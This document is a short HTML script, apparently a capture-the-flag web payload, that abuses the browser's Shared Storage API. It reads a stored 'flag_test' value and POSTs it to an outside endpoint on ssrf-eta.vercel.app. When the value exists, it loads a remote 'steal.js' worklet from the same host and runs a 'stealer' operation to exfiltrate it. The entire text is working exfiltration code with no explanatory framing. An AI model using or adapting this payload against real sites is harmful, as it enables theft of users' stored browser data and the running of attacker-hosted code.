<script>
  (async function() {
    const flag = await sharedStorage.get("flag_test");

    // Prepare the data to send to the capture endpoint
    const dataToSend = flag || "no flag yet"; // If flag exists, use it, else use default value.

    // Send the flag (or default) to https://ssrf-eta.vercel.app/api/capture
    await fetch("https://ssrf-eta.vercel.app/api/capture", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ flag: dataToSend })
    });

    console.log("Sent flag to capture endpoint.");

    // If flag_test exists, run the stealer
    if (flag) {
      sharedStorage.worklet.addModule("https://ssrf-eta.vercel.app/steal.js");
      sharedStorage.run("stealer");
      console.log("Running stealer to exfil flag.");
    } else {
      // If no flag_test exists, set it to the default value
      await sharedStorage.set("flag_test", "maybe");
      console.log("SharedStorage flag_test set to default value.");
    }
  })();
</script>
